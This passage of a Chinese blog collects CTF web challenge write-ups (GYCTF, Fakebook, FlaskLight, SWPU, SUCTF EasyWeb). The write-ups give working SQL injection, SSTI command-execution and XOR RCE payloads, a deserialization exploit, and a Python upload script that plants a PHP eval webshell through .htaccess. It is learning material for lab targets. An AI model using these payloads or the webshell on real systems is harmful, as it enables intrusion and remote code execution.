title="访问恶意mysql服务器读取文件"></a>访问恶意mysql服务器读取文件</h3><p><img src="image-20211030111040023.png" alt="image-20211030111040023"></p><p>登录成功后这个位置可以连接外部数据库</p><p>所以这里可以构建一个恶意mysql让网站去访问，达成任意文件读取的目的</p><p>恶意mysql的搭建之前在<code>https://atmujie.github.io/2021/10/28/%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8Fmysql/</code>有详细的说过</p><p>这里不重复说明</p><p>读取/etc/passwd</p><p><img src="image-20211030113114972.png" alt="image-20211030113114972"></p><h3 id="目录穿越遍历文件"><a href="#目录穿越遍历文件" class="headerlink" title="目录穿越遍历文件"></a>目录穿越遍历文件</h3><p>上面已经可以任意文件读取，但我不能读到任何网站文件</p><p>最后看了眼wp，还有一个目录穿越漏洞</p><p><img src="image-20211030113626799.png" alt="image-20211030113626799"></p><p>在查看数据位置可以看到文件夹下所以文件，抓包</p><p><img src="image-20211030113734765.png" alt="image-20211030113734765"></p><p>这里存在目录穿越漏洞，用%00做截断，即可实现对目录的遍历</p><p><img src="image-20211030114337129.png" alt="image-20211030114337129"></p><p>得到根目录下flag的文件名</p><p>然后恶意mysql读取文件，即可拿到flag</p><h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p><img src="image-20211030112944756.png" alt="image-20211030112944756"></p><pre class="line-numbers language-flag"><code class="language-flag">flag{37d1ec8f-0cf6-4607-815d-bafa1056b7c1}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><pre class="line-numbers language-payload"><code class="language-payload">?inject=1';show databases;use supersqli;show tables;handler FlagHere open;handler FlagHere read first;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后会有个对select 的过滤</p><p><img src="image-20211030174427962.png" alt="image-20211030174427962"></p><p>改用mysql中现在很少用的handler语句即可</p><h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{65aec67a-125b-4ffe-ac64-c3579a8425f1}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="sql注入联合查询"><a href="#sql注入联合查询" class="headerlink" title="sql注入联合查询"></a>sql注入联合查询</h3><p>进入题目，随便写几个数据打开</p><p><img src="image-20211030202306891.png" alt="image-20211030202306891"></p><p>这里本来猜测是ssrf漏洞，但过滤很严格，无法直接ssrf读取文件，后来看到url处no=1</p><p><img src="image-20211030202319055.png" alt="image-20211030202319055"></p><p>sql注入</p><p><img src="image-20211030203119284.png" alt="image-20211030203119284"></p><p>猜测语句</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> fromn users <span class="token keyword">where</span> <span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>联合查询</p><p><img src="image-20211030203433961.png" alt="image-20211030203433961"></p><p>得到所有数据</p><p><img src="image-20211030203528144.png" alt="image-20211030203528144"></p><h3 id="源码泄露、反序列化配合联合查询"><a href="#源码泄露、反序列化配合联合查询" class="headerlink" title="源码泄露、反序列化配合联合查询"></a>源码泄露、反序列化配合联合查询</h3><p>上面可以得知写入的数据在数据库里以序列化字符串的格式储存</p><p>那么调用时必然会将其反序化</p><p>这里卡了半小时没想出啥思路，结果打开wp人家第一句就是robots.txt源码泄露</p><p>草率了</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到源码，果然对直接写入的网站地址做了很严格的过滤</p><p>但这里可以和上面的sql注入配合</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//上面联合查询出的data值都为序列化字符串，所以猜测逻辑如下</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from users"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以利用联合注入将最后的data改成file:///…</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">"Atmujie"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O:8:"UserInfo":3:{s:4:"name";s:7:"Atmujie";s:3:"age";i:20;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-payload"><code class="language-payload">-1/**/unIon/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:7:"Atmujie";s:3:"age";i:20;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后在源码处得到一串base64，解码得到flag</p><p><img src="image-20211030210009026.png" alt="image-20211030210009026"></p><h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{ac61c23f-40c8-4264-9fc4-d0cdc868a4f9}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>较为简单的ssti，语言是python2</p><p>测试发现<code>__globals__</code>被过滤，字符拼接绕过</p><pre class="line-numbers language-payload"><code class="language-payload">{{config.__class__.__init__['__gl'+'obals__']['os'].popen('ls').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在flasklight目录下</p><p><img src="image-20211031215130024.png" alt="image-20211031215130024"></p><h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{8e1b05ca-84f9-417d-a4fc-ca2e4e5ed5cf}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>题目有登录注册，但经过测试，登录成功后在广告申请位置存在sql注入</p><p>先猜测语句</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">user</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>vlaues<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span><span class="token string">"vlaues"</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试了好一会没发现什么问题</p><p>打开发现sql注入</p><p>也就是说插入位置并不存在注入点，但读取查看时存在</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$sel</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from user where id=$id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以注入语句后再打开详情，即可造成sql注入</p><blockquote><p>我觉得正常思路应该在注入语句后发现输入被原份不动的写入没有加任意过滤时，就该想到二次注入的问题</p><p>而不是想我这样点开才发现</p><p>大概这就是我刷题太少的体现，对题目不够敏感</p></blockquote><h3 id="创建虚拟表无列名注入"><a href="#创建虚拟表无列名注入" class="headerlink" title="创建虚拟表无列名注入"></a>创建虚拟表无列名注入</h3><p>过滤了报错注入，只能使用联合查询或者盲注，二次注入盲注脚本写起来比较麻烦，这里用联合查询</p><p>所以，我想给出题人加个红buff</p><p><img src="image-20211101105418111.png" alt="image-20211101105418111"></p><p>t喵的22列的库，正常人出的题？</p><p>这道题还过滤了or，无法使用information进行查询</p><p>这里使用其他的系统库mysql.innodb_table_stats</p><p>这里我之前写过详解<code>https://atmujie.github.io/2020/12/08/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#toc-heading-20</code></p><pre class="line-numbers language-payload"><code class="language-payload">title=1' union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到表名</p><p><img src="image-20211101193033881.png" alt="image-20211101193033881"></p><p>过滤了join</p><p>所以采用创建虚拟表的形式直接查询</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">title='union/**/select/**/1,(select/**/group_concat(C)/**/from/**/(select/**/'A','B','C'/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00&content=111&ac=add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211101193741131.png" alt="image-20211101193741131"></p><h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{43b461a7-c4d5-41ac-ba3c-e966bf9924a6}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>这道题考察了一个小知识点，有过开发经验的人应该很容易做出来</p><h3 id="json中文编码的衍生"><a href="#json中文编码的衍生" class="headerlink" title="json中文编码的衍生"></a>json中文编码的衍生</h3><p>目前主流网站进行前后端交互式时首选的基本都是json格式</p><p>为了解决中文数据交互时产生的乱码问题，json对中文会采用Unicode编码来处理</p><p><img src="image-20211103212740180-16359460605461.png" alt="image-20211103212740180"></p><p>而题目代码的逻辑有问题</p><p><img src="image-20211103213010499.png" alt="image-20211103213010499"></p><p>源码对获取到的未经处理的$body进行了编码而不是对json解码后的内容进行处理，所以用json对Unicode的支持，可以将数据编码为Uniocde格式绕过对$body的检测</p><pre class="line-numbers language-payload"><code class="language-payload">{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=query.php"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制payload，抓包上传</p><p><img src="image-20211103215643683.png" alt="image-20211103215643683"></p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211103215917272.png" alt="image-20211103215917272"></p><h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{c7647449-7518-4c68-af28-270b657251d2}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><h3 id="无字母rce异或执行"><a href="#无字母rce异或执行" class="headerlink" title="无字母rce异或执行"></a>无字母rce异或执行</h3><p>第一个考点已经被考烂了，但还是有很大的学习价值</p><p>原理现在很多文章都有讲，我这里也不细说，就放个自己修修改改写了大半天的脚本</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 正则表达式</span><span class="token keyword">const</span> <span class="token constant">PRE</span> <span class="token operator">=</span> <span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 匹配字符</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"_GET"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                    =============================================</span><span class="token comment" spellcheck="true">//                    =================以下无需修改=================</span><span class="token comment" spellcheck="true">//                    =============================================</span><span class="token comment" spellcheck="true">// 查找没有匹配的字符</span><span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 没有匹配到就压入数组</span><span class="token comment" spellcheck="true">/* * 异或要从127之后开始，确保为不可见字符*/</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token number">255</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token constant">PRE</span><span class="token punctuation">,</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">xorCode</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$strs</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$strs</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$strs</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$bool</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bool</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 判断异或</span>                <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$byte</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$byte</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$strs</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$len</span><span class="token operator">--</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// 将第一个匹配到的异或表达式写入数组</span>                    <span class="token variable">$flag1</span><span class="token punctuation">[</span><span class="token variable">$strs</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$flag2</span><span class="token punctuation">[</span><span class="token variable">$len</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$bool</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"\${"</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"^"</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">xorCode</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我写的很长时间的原因也很简单，这里就当一个坑谈谈</p><p>异或时需要尽可能的避免出现可见字符，在执行的过程中，一些字符会对异或造成影响【比如}和:】</p><p>说的简单点，字符要从ascii码表127之后匹配</p><p>我就是从0开始，一直执行失败，写代码半小时，修改大半天后发现还是原来的版本…….</p><ul><li>因为有字符数的限制，所以不能完全的写异或字符，所以payload如下</li></ul><pre class="line-numbers language-payload"><code class="language-payload">?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211104220812522.png" alt="image-20211104220812522"></p><h3 id="上传-htaccess文件-getshell"><a href="#上传-htaccess文件-getshell" class="headerlink" title="上传.htaccess文件 getshell"></a>上传.htaccess文件 getshell</h3><p>题目开始给了我们一个get_the_flag 函数，但并没有执行，这步正好可以利用上面的异或来执行这个函数</p><p><img src="image-20211104221159566.png" alt="image-20211104221159566"></p><pre class="line-numbers language-payload"><code class="language-payload">?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=get_the_flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里上传文件需要满足三个条件</p><ul><li><p>后缀名不能有ph</p><p>  有两个思路，一是截断后缀名，解析绕过等，二是上传.htaccess添加解析条件</p></li><li><p>文件内容不能出现&lt;?</p><p>  php5版本使用<code>&lt;script language=&quot;php&quot;&gt;eval();&lt;/script&gt;</code>来绕过限制，但这个方法在php7中不可用【异或命令执行可得知php版本为7.2.19】</p></li><li><p>文件前6个字节需为图片标识</p><p>  这个条件最简单，只需要在文件开头加上GIF89A12即可</p></li></ul><p>第一个条件二选一可以暂留，主要是第二个</p><p>这里我看了wp</p><p>++++</p><p><strong>用python文件上传：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token comment" spellcheck="true"># b"xxx"以字节的形式储存数据</span><span class="token triple-quoted-string string">"""python中多行注释单独写出为注释，写入变量为多行写入    题目要求文件开头为图片，但.htaccess无法生效    所以使用#define width 1337#define height 1337 绕过    #表示注释    接下来就是两行规则，讲.pp解析为php,base64解码shell.ppp"""</span>htaccess <span class="token operator">=</span> b<span class="token triple-quoted-string string">"""#define width 1337#define height 1337 AddType application/x-httpd-php .pppphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ppp""""</span>shell <span class="token operator">=</span> b<span class="token string">"GIF89A12"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">"&lt;?php eval($_REQUEST['cmd']);?>"</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://c5fc0561-1461-4eef-a3ce-fd83d3b7f5be.node3.buuoj.cn/?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&amp;%86=get_the_flag"</span><span class="token comment" spellcheck="true">#上传两个文件</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span>htaccess<span class="token punctuation">,</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>data <span class="token 